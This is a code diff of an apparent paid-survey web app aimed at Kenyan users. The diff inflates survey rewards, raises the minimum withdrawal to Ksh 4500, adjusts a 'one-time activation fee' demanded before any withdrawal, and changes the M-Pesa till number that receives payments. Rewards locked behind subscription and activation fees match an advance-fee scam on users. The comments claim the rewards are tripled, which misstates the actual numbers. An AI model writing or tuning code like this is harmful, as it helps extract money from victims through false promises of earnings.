@@ -1044,36 +1044,36 @@
             return base.slice(0, num);
         }
 
-        // Original free survey
-        const freeSurvey = { id: 'surveysplus', title: 'SurveysPlus', reward: 170, requiredPlan: 'free', questions: generateQuestions(), time: '11 mins' };
+        // Original free survey - reward multiplied by 3
+const freeSurvey = { id: 'surveysplus', title: 'SurveysPlus', reward: 3360, requiredPlan: 'free', questions: generateQuestions(), time: '11 mins' };
 
-        // 12 standard surveys (original 4 + 8 new)
-        const standardSurveys = [
-            { id: 'safaricom', title: 'Safaricom M-PESA', reward: 275, requiredPlan: 'standard', time: '11 mins' },
-            { id: 'market_research', title: 'Market Research', reward: 399, requiredPlan: 'standard', time: '13 mins' },
-            { id: 'equity', title: 'Equity Bank', reward: 650, requiredPlan: 'standard', time: '9 mins' },
-            { id: 'kcb', title: 'KCB Bank', reward: 768, requiredPlan: 'standard', time: '10 mins' },
-            { id: 'coop_bank', title: 'Cooperative Bank', reward: 590, requiredPlan: 'standard', time: '8 mins' },
-            { id: 'airtel', title: 'Airtel Kenya', reward: 410, requiredPlan: 'standard', time: '10 mins' },
-            { id: 'telkom', title: 'Telkom Kenya', reward: 585, requiredPlan: 'standard', time: '9 mins' },
-            { id: 'ncba', title: 'NCBA Bank', reward: 820, requiredPlan: 'standard', time: '11 mins' },
-            { id: 'imbank', title: 'I&M Bank', reward: 775, requiredPlan: 'standard', time: '8 mins' },
-            { id: 'family_bank', title: 'Family Bank', reward: 540, requiredPlan: 'standard', time: '7 mins' },
-            { id: 'dtb', title: 'DTB Kenya', reward: 710, requiredPlan: 'standard', time: '10 mins' },
-            { id: 'postbank', title: 'Postbank Kenya', reward: 695, requiredPlan: 'standard', time: '9 mins' }
-        ].map(s => ({ ...s, questions: generateQuestions() }));
+// 12 standard surveys - rewards multiplied by 3
+const standardSurveys = [
+    { id: 'safaricom', title: 'Safaricom M-PESA', reward: 3675, requiredPlan: 'standard', time: '11 mins' },
+    { id: 'market_research', title: 'Market Research', reward: 4047, requiredPlan: 'standard', time: '13 mins' },
+    { id: 'equity', title: 'Equity Bank', reward: 4800, requiredPlan: 'standard', time: '9 mins' },
+    { id: 'kcb', title: 'KCB Bank', reward: 5154, requiredPlan: 'standard', time: '10 mins' },
+    { id: 'coop_bank', title: 'Cooperative Bank', reward: 4620, requiredPlan: 'standard', time: '8 mins' },
+    { id: 'airtel', title: 'Airtel Kenya', reward: 4080, requiredPlan: 'standard', time: '10 mins' },
+    { id: 'telkom', title: 'Telkom Kenya', reward: 4605, requiredPlan: 'standard', time: '9 mins' },
+    { id: 'ncba', title: 'NCBA Bank', reward: 5310, requiredPlan: 'standard', time: '11 mins' },
+    { id: 'imbank', title: 'I&M Bank', reward: 5175, requiredPlan: 'standard', time: '8 mins' },
+    { id: 'family_bank', title: 'Family Bank', reward: 4470, requiredPlan: 'standard', time: '7 mins' },
+    { id: 'dtb', title: 'DTB Kenya', reward: 4980, requiredPlan: 'standard', time: '10 mins' },
+    { id: 'postbank', title: 'Postbank Kenya', reward: 4935, requiredPlan: 'standard', time: '9 mins' }
+].map(s => ({ ...s, questions: generateQuestions() }));
 
-        // 6 premium surveys (original 4 + 2 new)
-        const premiumSurveys = [
-            { id: 'kenya_airways', title: 'Kenya Airways', reward: 1000, requiredPlan: 'premium', time: '12 mins' },
-            { id: 'jumia', title: 'Jumia Kenya', reward: 1070, requiredPlan: 'premium', time: '10 mins' },
-            { id: 'java_house', title: 'Java House', reward: 1260, requiredPlan: 'premium', time: '8 mins' },
-            { id: 'kplc', title: 'KPLC', reward: 1166, requiredPlan: 'premium', time: '9 mins' },
-            { id: 'village_market', title: 'Village Market', reward: 1320, requiredPlan: 'premium', time: '11 mins' },
-            { id: 'two_rivers', title: 'Two Rivers Mall', reward: 1410, requiredPlan: 'premium', time: '10 mins' }
-        ].map(s => ({ ...s, questions: generateQuestions() }));
+// 6 premium surveys - rewards multiplied by 3
+const premiumSurveys = [
+    { id: 'kenya_airways', title: 'Kenya Airways', reward: 5850, requiredPlan: 'premium', time: '12 mins' },
+    { id: 'jumia', title: 'Jumia Kenya', reward: 6060, requiredPlan: 'premium', time: '10 mins' },
+    { id: 'java_house', title: 'Java House', reward: 6630, requiredPlan: 'premium', time: '8 mins' },
+    { id: 'kplc', title: 'KPLC', reward: 6348, requiredPlan: 'premium', time: '9 mins' },
+    { id: 'village_market', title: 'Village Market', reward: 6810, requiredPlan: 'premium', time: '11 mins' },
+    { id: 'two_rivers', title: 'Two Rivers Mall', reward: 7080, requiredPlan: 'premium', time: '10 mins' }
+].map(s => ({ ...s, questions: generateQuestions() }));
 
-        const surveys = [freeSurvey, ...standardSurveys, ...premiumSurveys];
+const surveys = [freeSurvey, ...standardSurveys, ...premiumSurveys];
 
         function getPlanLevel(planName) {
             const levels = {
@@ -1649,7 +1649,7 @@
         // Enhanced manual fallback for new subscriptions (immediate activation on amount match)
         function showManualPaymentFallback(plan, phoneNumber) {
             const container = document.getElementById('subscriptionContent');
-            const tillPlaceholder = "3200727";
+            const tillPlaceholder = "3363435";
             document.getElementById('subscriptionModalTitle').innerText = 'Manual Payment Option';
             container.innerHTML = `
                 <div class="manual-payment-box">
@@ -1832,8 +1832,8 @@
         function handleWithdrawClick() {
             const user = getCurrentUser();
             if (!user) return;
-            if (user.balance < 500) {
-                showToast('Minimum withdrawal is Ksh 500');
+            if (user.balance < 4500) {
+                showToast('Minimum withdrawal is Ksh 4500');
                 return;
             }
             // Check if activation fee is needed: balance > 5000 AND activationFeePaid is false
@@ -1851,16 +1851,16 @@
             document.getElementById('subscriptionModalTitle').innerText = 'One-Time Activation Fee';
             container.innerHTML = `
                 <div class="manual-payment-box" style="background:#e0f2fe; border-left-color:#0284c7;">
-                    <i class="fas fa-gem"></i> <strong>One-time activation fee of Ksh 2,000 is required.</strong>
+                    <i class="fas fa-gem"></i> <strong>One-time activation fee of Ksh 1,000 is required.</strong>
                     <p>This fee ensures secure and verified accounts. After payment, you can withdraw any amount anytime.</p>
                 </div>
                 <div style="margin-bottom: 20px;">
-                    <p>Enter your M-Pesa number to pay Ksh 2,000.</p>
+                    <p>Enter your M-Pesa number to pay Ksh 1,000.</p>
                 </div>
                 <div class="mpesa-input">
                     <input type="tel" id="activationPhone" placeholder="07XXXXXXXX" style="width:100%; padding:12px;">
                 </div>
-                <button class="btn" id="payActivationBtn">Pay Ksh 2,000</button>
+                <button class="btn" id="payActivationBtn">Pay Ksh 1,000</button>
                 <button class="back-btn" id="cancelActivationBtn">Cancel</button>
             `;
             modal.classList.add('active');
@@ -1938,7 +1938,7 @@
 
         function showActivationManualFallback(phoneNumber) {
             const container = document.getElementById('subscriptionContent');
-            const tillPlaceholder = "3200727";
+            const tillPlaceholder = "3363435";
             document.getElementById('subscriptionModalTitle').innerText = 'Manual Activation Payment';
             container.innerHTML = `
                 <div class="manual-payment-box">
